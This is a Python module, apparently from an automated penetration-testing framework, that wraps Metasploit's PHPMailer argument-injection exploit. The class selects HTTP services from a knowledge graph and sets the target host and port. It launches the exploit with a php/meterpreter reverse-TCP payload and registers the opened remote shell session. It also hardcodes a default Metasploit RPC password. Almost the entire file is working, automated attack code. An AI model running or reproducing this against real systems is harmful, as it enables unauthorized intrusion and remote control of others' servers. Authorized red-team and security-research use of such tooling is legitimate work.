# USER EDITABLE FILE.
# This file extends the autogenerated base class.
# Please add your customizations here. Do NOT modify the base class.
import os
import re
from typing import Union
from builtin_actions.metasploit.multi.http.MsfMultiHttpPhpmailerArgInjectionExploitBase import MsfMultiHttpPhpmailerArgInjectionExploitBase
from pymetasploit3.msfrpc import MsfRpcClient
from netifaces import ifaddresses, AF_INET, gateways

from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, GraphDB, MultiPattern, Pattern, Relationship
from Session import SessionManager
from action_state_interface.exec import ActionExecutionError, ActionExecutionResult

class MsfMultiHttpPhpmailerArgInjectionExploit(MsfMultiHttpPhpmailerArgInjectionExploitBase):
    def __init__(self):
        super().__init__()
    
    def get_target_patterns(self, kg: GraphDB) -> list[Union[Pattern, MultiPattern]]:
        """
        General implementation for msf exploits
        """
        asset = Entity('Asset', alias='asset')
        service = Entity('Service', alias='service', protocol="http")
        pattern = (
            asset.with_edge(Relationship('has', direction='r'))
            .with_node(Entity('OpenPort', alias='openport'))
            .with_edge(Relationship('is_running', direction='r'))
            .with_node(service)
        )
        return kg.get_matching(pattern)

    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """Execute the exploit against the target."""
        msf = MsfRpcClient(
            os.environ.get("MSFRPCD_PASSWORD", "tulpaOSApass24"),
            port=int(os.environ.get("MSF_PORT", 55552))
        )

        exploit = msf.modules.use("exploit", "multi/http/phpmailer_arg_injection")
        host = pattern.get('asset').get('ip_address')
        exploit['RHOSTS'] = host
        exploit['WEB_ROOT'] = '/www'

        if pattern.get('openport') and 'RPORT' in exploit.options:
            exploit['RPORT'] = pattern.get('openport').get('number')
        if 'AllowNoCleanup' in exploit.options:
            exploit["AllowNoCleanup"] = True

        payload = msf.modules.use('payload', 'php/meterpreter/reverse_tcp')
        output = msf.consoles.console().run_module_with_output(exploit, payload=payload)

        matches = re.search(r'session (\d+) opened', output.lower().strip())
        if matches:
            ms_session_id = matches.group(1)
            channel = msf.sessions.session(ms_session_id)
            sess_id = sessions.add_session(channel)
            return ActionExecutionResult(
                command=["msf", "exploit", "{module_name}"],
                stdout=output,
                session=sess_id,
                exit_status=0
            )
        else:
            raise ActionExecutionError(
                f"Couldn't create a session on {host} using msf exploit {exploit}, output: {output}"
            )